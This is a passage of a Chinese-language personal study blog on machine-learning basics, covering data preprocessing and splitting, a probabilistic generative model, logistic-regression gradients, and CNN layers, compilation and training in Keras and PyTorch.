-<span class="number">4</span>, -<span class="number">5</span>, -<span class="number">6</span>],</span><br><span class="line">                    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                    [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">test_data = stdScaler.transform(test_data)</span><br></pre></td></tr></table></figure></li><li><p>离散化：LabelBinarizer</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelBinarizer</span><br><span class="line"></span><br><span class="line">train_label = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">lb = LabelBinarizer()</span><br><span class="line"><span class="comment"># 在处理训练数据时使用fit_transform</span></span><br><span class="line">train_label = lb.fit_transform(train_label)</span><br><span class="line"><span class="built_in">print</span>(train_label)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">[[1 0 0 0 0 0]</span></span><br><span class="line"><span class="string"> [0 1 0 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 1 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 1 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 1 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 0 1]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">test_label = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># 在处理测试数据时使用transform</span></span><br><span class="line">test_label = lb.transform(test_label)</span><br><span class="line"><span class="built_in">print</span>(test_label)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">[[0 1 0 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 1 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 1 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 1 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 0 1]</span></span><br><span class="line"><span class="string"> [1 0 0 0 0 0]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="3-数据分割"><a href="#3-数据分割" class="headerlink" title="3. 数据分割"></a>3. 数据分割</h2><p>原始数据如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x_train = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)])</span><br><span class="line">y_train = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)])</span><br><span class="line"><span class="built_in">print</span>(x_train.shape[<span class="number">0</span>], y_train.shape[<span class="number">0</span>])</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">10000 10000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></p><h3 id="3-1-手动分割"><a href="#3-1-手动分割" class="headerlink" title="3.1 手动分割"></a>3.1 手动分割</h3><p>按照比例分割<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">segmentation</span>(<span class="params">x_train, y_train, proportion</span>):</span><br><span class="line">    train_data = []</span><br><span class="line">    train_label = []</span><br><span class="line">    val_data = []</span><br><span class="line">    val_label = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x_train.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> i % proportion == <span class="number">0</span>:</span><br><span class="line">            val_data.append(x_train[i])</span><br><span class="line">            val_label.append(y_train[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            train_data.append(x_train[i])</span><br><span class="line">            train_label.append(y_train[i])</span><br><span class="line">    train_data = np.array(train_data, dtype=<span class="built_in">float</span>)</span><br><span class="line">    train_label = np.array(train_label, dtype=<span class="built_in">float</span>)</span><br><span class="line">    val_data = np.array(val_data, dtype=<span class="built_in">float</span>)</span><br><span class="line">    val_label = np.array(val_label, dtype=<span class="built_in">float</span>)</span><br><span class="line">    <span class="keyword">return</span> train_data, train_label, val_data, val_label</span><br><span class="line"></span><br><span class="line">train_data, train_label, val_data, val_label = segmentation(x_train, y_train, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(train_data), <span class="built_in">len</span>(train_label), <span class="built_in">len</span>(val_data), <span class="built_in">len</span>(val_label))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">9000 9000 1000 1000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></p><h3 id="3-2-利用sklearn"><a href="#3-2-利用sklearn" class="headerlink" title="3.2 利用sklearn"></a>3.2 利用sklearn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SEED = <span class="number">12</span>   <span class="comment"># 指定随机数种子以便再现</span></span><br><span class="line">train_data, train_label, val_data, val_label = (</span><br><span class="line">    train_test_split(x_train, y_train, test_size=<span class="number">0.2</span>, random_state=SEED))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(train_data), <span class="built_in">len</span>(train_label), <span class="built_in">len</span>(val_data), <span class="built_in">len</span>(val_label))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">8000 2000 8000 2000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="三、模型构建"><a href="#三、模型构建" class="headerlink" title="三、模型构建"></a>三、模型构建</h1><h2 id="1-概率生成模型"><a href="#1-概率生成模型" class="headerlink" title="1. 概率生成模型"></a>1. 概率生成模型</h2><p>相关文章：<a href="https://juejin.cn/post/7325652953540739083">机器学习笔记——概率生成模型 - 掘金 (juejin.cn)</a></p><p>1.概率生成模型要求先将数据集分割为两部分：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class_0_id = []</span><br><span class="line">class_1_id = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.data[<span class="string">&#x27;Y_train&#x27;</span>].shape[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">if</span> self.data[<span class="string">&#x27;Y_train&#x27;</span>][i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        class_0_id.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        class_1_id.append(i)</span><br><span class="line"></span><br><span class="line">class_0 = self.data[<span class="string">&#x27;X_train&#x27;</span>][class_0_id]</span><br><span class="line">class_1 = self.data[<span class="string">&#x27;X_train&#x27;</span>][class_1_id]</span><br></pre></td></tr></table></figure><br>这里用到了高级索引，参考：<a href="https://www.runoob.com/numpy/numpy-advanced-indexing.html">NumPy 高级索引 | 菜鸟教程 (runoob.com)</a></p><p>2.分别求两部分的均值和协方差矩阵，共享协方差矩阵是两者的加权平均和：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mean_0 = np.mean(class_0, axis=<span class="number">0</span>)</span><br><span class="line">mean_1 = np.mean(class_1, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">n = class_0.shape[<span class="number">1</span>]</span><br><span class="line">cov_0 = np.zeros((n, n))</span><br><span class="line">cov_1 = np.zeros((n, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(class_0.shape[<span class="number">0</span>]):</span><br><span class="line">    cov_0 += np.dot(np.transpose([class_0[i] - mean_0]), [(class_0[i] - mean_0)]) / class_0.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(class_1.shape[<span class="number">0</span>]):</span><br><span class="line">    cov_1 += np.dot(np.transpose([class_1[i] - mean_1]), [(class_1[i] - mean_1)]) / class_1.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">cov = (cov_0 * class_0.shape[<span class="number">0</span>] + cov_1 * class_1.shape[<span class="number">0</span>]) / (class_0.shape[<span class="number">0</span>] + class_1.shape[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p><p>3.由概率生成模型的参数为：</p><script type="math/tex; mode=display">\omega = (\mu^0 - \mu^1)^T \Sigma^{-1}</script><script type="math/tex; mode=display">b = - \frac{1}{2} (\mu^0)^T \Sigma^{-1} \mu^0 + \frac{1}{2} (\mu^1)^T \Sigma^{-1} \mu^1 + \ln{ \frac{m_0}{m_1}}</script><p>得到<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">self.w = np.transpose(((mean_0 - mean_1)).dot(inv(cov)))</span><br><span class="line">self.b = (- <span class="number">0.5</span>) * (mean_0).dot(inv(cov)).dot(mean_0) \</span><br><span class="line">         + <span class="number">0.5</span> * (mean_1).dot(inv(cov)).dot(mean_1) \</span><br><span class="line">         + np.log(<span class="built_in">float</span>(class_0.shape[<span class="number">0</span>]) / class_1.shape[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p><h2 id="2-逻辑回归"><a href="#2-逻辑回归" class="headerlink" title="2. 逻辑回归"></a>2. 逻辑回归</h2><p>1.打乱数据集：利用高级索引，将特征和标签同时打乱且仍然能够互相对应：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_shuffle</span>(<span class="params">X, Y</span>):</span><br><span class="line">    randomize = np.arange(X.shape[<span class="number">0</span>])</span><br><span class="line">    shuffle(randomize)</span><br><span class="line">    <span class="keyword">return</span> X[randomize], Y[randomize]</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">X = np.array([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">              [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">              [<span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">              [<span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">              [<span class="number">9</span>, <span class="number">10</span>]])</span><br><span class="line">Y = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">X, Y = _shuffle(X, Y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(X)</span><br><span class="line"><span class="built_in">print</span>(Y)</span><br></pre></td></tr></table></figure><br>输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[[ 5  6]</span><br><span class="line"> [ 9 10]</span><br><span class="line"> [ 1  2]</span><br><span class="line"> [ 7  8]</span><br><span class="line"> [ 3  4]]</span><br><span class="line">[2 4 0 3 1]</span><br></pre></td></tr></table></figure></p><p>2.batch划分：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(np.floor(<span class="built_in">len</span>(Y_train)/batch_size))):</span><br><span class="line">           X = X_train[idx*batch_size:(idx+<span class="number">1</span>)*batch_size]</span><br><span class="line">           Y = Y_train[idx*batch_size:(idx+<span class="number">1</span>)*batch_size]</span><br></pre></td></tr></table></figure></p><p>3.求梯度：根据梯度公式$\frac{\partial J(\theta) }{\partial \theta_j}= \frac{1}{m} [ \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} + \lambda \theta_j]$，得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_gradient_regularization</span>(<span class="params">X, Y_label, w, b, lamda</span>):</span><br><span class="line">    <span class="comment"># return the mean of the graident</span></span><br><span class="line">    y_pred = get_prob(X, w, b)</span><br><span class="line">    pred_error = Y_label - y_pred</span><br><span class="line">    w_grad = -np.mean(np.multiply(pred_error.T, X.T), <span class="number">1</span>)+lamda*w</span><br><span class="line">    b_grad = -np.mean(pred_error)</span><br><span class="line">    <span class="keyword">return</span> w_grad, b_grad</span><br></pre></td></tr></table></figure><br>详解：梯度$w$和$b$合起来就是公式中的$\theta$，为一个$n + 1$维列向量<br>pred_error 和 X 都是$m \times n$维矩阵，两者作内积后需要对$m$所在维度求平均值，可以有以下两种实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先转置得到n*m维矩阵，再在第二个维度，即axis=1上求平均值</span></span><br><span class="line">w_grad = -np.mean(np.multiply(pred_error.T, X.T), axis=<span class="number">1</span>) + lamda*w </span><br><span class="line"><span class="comment"># 对m*n维矩阵在第一个维度求平均值，即axis=0，再转置</span></span><br><span class="line">w_grad = -np.mean(np.multiply(pred_error, X), axis=<span class="number">0</span>).T + lamda*w </span><br></pre></td></tr></table></figure></p><h2 id="3-卷积神经网络"><a href="#3-卷积神经网络" class="headerlink" title="3. 卷积神经网络"></a>3. 卷积神经网络</h2><p>搭建网络那就要按李宏毅说的三步走了！</p><ol><li>打开冰箱：定义网络结构，即选定一批函数</li><li>把大象放进冰箱里：确定损失函数和优化方法，即定义评价函数优劣的方法</li><li>关冰箱门：拟合数据集，找到最优的函数</li></ol><p>建议多查阅api文档：<a href="https://keras.io/api">Keras API文档</a></p><h3 id="3-1-定义网络结构：model-add"><a href="#3-1-定义网络结构：model-add" class="headerlink" title="3.1 定义网络结构：model.add"></a>3.1 定义网络结构：model.add</h3><h4 id="3-1-1-卷积层"><a href="#3-1-1-卷积层" class="headerlink" title="3.1.1 卷积层"></a>3.1.1 卷积层</h4><p>后面常接BatchNormalization，能加快训练和提升性能（未考究）</p><ul><li>在torch中：torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride=1, padding=0.dilation=1, groups=1, bias=True, padding_mode=’zeros’),示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nn.Conv2d(<span class="number">1</span>, <span class="number">64</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">nn.BatchNorm2d(<span class="number">64</span>)</span><br></pre></td></tr></table></figure></li><li>在keras中：keras.layers.Conv2D(<br>filters,<br>kernel_size,<br>strides=(1, 1),<br>padding=”valid”,<br>kernel_initializer=”glorot_uniform”,<br>bias_initializer=”zeros”,<br>…<br>)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">model.add(Conv2D(input_shape=(<span class="number">48</span>, <span class="number">48</span>, <span class="number">1</span>), filters=<span class="number">64</span>, kernel_size=(<span class="number">4</span>, <span class="number">4</span>), strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>,</span><br><span class="line">                 kernel_initializer=RandomNormal(mean=<span class="number">0.0</span>, stddev=<span class="number">0.05</span>, seed=SEED)))</span><br><span class="line">model.add(BatchNormalization())</span><br></pre></td></tr></table></figure><h4 id="3-1-2-激活层"><a href="#3-1-2-激活层" class="headerlink" title="3.1.2 激活层"></a>3.1.2 激活层</h4><ul><li>在torch中：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nn.LeakyReLU(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><ul><li>在keras中：不太理解，有的是在layers引入，有的在activations引入，也可以在layer的参数中指定<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(LeakyReLU(alpha=<span class="number">0.2</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(layers.Activation(activations.relu))</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-1-3-池化层"><a href="#3-1-3-池化层" class="headerlink" title="3.1.3 池化层"></a>3.1.3 池化层</h4><ul><li>在torch中：torch.nn.MaxPool2d(kernel_size, stride=None, padding=0, dilation=1, return_indices=False, ceil_mode=False)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>)  <span class="comment"># kernel_size=2, stride=2, padding=0</span></span><br></pre></td></tr></table></figure></li><li>在keras中：<br>keras.layers.MaxPooling2D(<br>pool_size=(2, 2), strides=None, padding=”valid”, …<br>)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-1-4-全连接层"><a href="#3-1-4-全连接层" class="headerlink" title="3.1.4 全连接层"></a>3.1.4 全连接层</h4><ul><li>在torch中：torch.nn.Linear(in_features, out_features, bias=True)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nn.Linear(<span class="number">256</span>*<span class="number">3</span>*<span class="number">3</span>, <span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li><li>在keras中：<br>keras.layers.Dense(<br>units,<br>activation=None,<br>use_bias=True,<br>kernel_initializer=”glorot_uniform”,<br>bias_initializer=”zeros”,<br>…<br>)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(Dense(units=<span class="number">1024</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="3-1-5-一些优化"><a href="#3-1-5-一些优化" class="headerlink" title="3.1.5 一些优化"></a>3.1.5 一些优化</h4><p><strong>1. 添加kernel_initialization:</strong></p><ul><li>在torch中：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gaussian_weights_init</span>(<span class="params">m</span>):</span><br><span class="line">    classname = m.__class__.__name__</span><br><span class="line">    <span class="keyword">if</span> classname.find(<span class="string">&#x27;Conv&#x27;</span>) != -<span class="number">1</span> <span class="keyword">and</span> classname.find(<span class="string">&#x27;Conv&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">        m.weight.data.normal_(<span class="number">0.0</span>, <span class="number">0.02</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">self.cnn = nn.Sequential(</span><br><span class="line">           <span class="comment"># 省略大量代码</span></span><br><span class="line">        )</span><br><span class="line">self.fc = nn.Sequential(</span><br><span class="line">           <span class="comment"># 省略大量代码</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">self.cnn.apply(gaussian_weights_init)</span><br><span class="line">self.fc.apply(gaussian_weights_init)</span><br></pre></td></tr></table></figure></li><li>在keras中：在带参数的layer中添加参数kernel_initalization（好麻烦）</li></ul><p>问了gpt，他说可以这样，还没试过：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initializer = RandomNormal(mean=<span class="number">0.0</span>, stddev=<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> layer <span class="keyword">in</span> model.layers: </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(layer, <span class="string">&#x27;kernel_initializer&#x27;</span>): </span><br><span class="line">        layer.kernel_initializer = initializer</span><br></pre></td></tr></table></figure></p><p><strong>2. 添加Dropout层:</strong></p><p>丢弃部分神经网络的输入，减少过拟合（好像不能跟BatchNormalization一起用）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(Dropout(rate=<span class="number">0.5</span>))</span><br></pre></td></tr></table></figure></p><h3 id="3-2-选择优化方法：model-complie"><a href="#3-2-选择优化方法：model-complie" class="headerlink" title="3.2 选择优化方法：model.complie"></a>3.2 选择优化方法：model.complie</h3><p>源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Model.<span class="built_in">compile</span>(</span><br><span class="line">    optimizer=<span class="string">&quot;rmsprop&quot;</span>,</span><br><span class="line">    loss=<span class="literal">None</span>,</span><br><span class="line">    loss_weights=<span class="literal">None</span>,</span><br><span class="line">    metrics=<span class="literal">None</span>,</span><br><span class="line">    weighted_metrics=<span class="literal">None</span>,</span><br><span class="line">    run_eagerly=<span class="literal">False</span>,</span><br><span class="line">    steps_per_execution=<span class="number">1</span>,</span><br><span class="line">    jit_compile=<span class="string">&quot;auto&quot;</span>,</span><br><span class="line">    auto_scale_loss=<span class="literal">True</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>optimizer: 优化器, 包括SGD, RMSprop, Adam等<br>metrics: 评价标准, 包括accuracy(准确率), binary_accuracy(二分类)、categorical_accuracy(多分类) 等<br>loss: 损失函数, 包括mse, binary_crossentropy, categorical_crossentropy等<br>verbose: 日志显示，verbose=0不显示, verbose=1为每个verbose显示进度条, verbose=2每个verbose输出一次</p><p>示例:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">              optimizer=Adam(learning_rate=<span class="number">0.001</span>),</span><br><span class="line">              metrics=[keras.metrics.CategoricalAccuracy()])</span><br></pre></td></tr></table></figure></p><h3 id="3-3-拟合数据集：model-fit"><a href="#3-3-拟合数据集：model-fit" class="headerlink" title="3.3 拟合数据集：model.fit"></a>3.3 拟合数据集：model.fit</h3><p>fit的参数如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.fit(x, y, batch_size, epochs, verbose, validation_split, validation_data, validation_freq)</span><br></pre></td></tr></table></figure><br>fit返回一个History对象记录了每一个epoch的数据，可用于绘图<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H = model.fit(x_data, x_label,</span><br><span class="line">              epochs=EPOCHS,</span><br><span class="line">              batch_size=BATCH_SIZE,</span><br><span class="line">              validation_data=(val_data, val_label),</span><br><span class="line">              verbose=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># plot</span></span><br><span class="line">N = np.arange(<span class="number">0</span>, EPOCHS)</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(N, H.history[<span class="string">&quot;loss&quot;</span>], label=<span class="string">&quot;train loss&quot;</span>)</span><br><span class="line">plt.plot(N, H.history[<span class="string">&quot;val_loss&quot;</span>], label=<span class="string">&quot;val loss&quot;</span>)</span><br><span class="line">plt.plot(N, H.history[<span class="string">&quot;accuracy&quot;</span>], label=<span class="string">&quot;train_acc&quot;</span>)</span><br><span class="line">plt.plot(N, H.history[<span class="string">&quot;val_accuracy&quot;</span>], label=<span class="string">&quot;val_acc&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Training Loss and Accuracy (Simple NN)&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Epoch #&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Loss/Accuracy&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><br>fit后的模型可以对测试数据作预测<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pred_raw = model.predict(test_data)</span><br></pre></td></tr></table></figure><br>及时保存模型，我可不想白练了一晚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存模型</span></span><br><span class="line">save_path = <span class="string">&#x27;./model_0120&#x27;</span></span><br><span class="line">model.save(save_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><blockquote><p>还有看到fit_generator的，之后再看一下</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
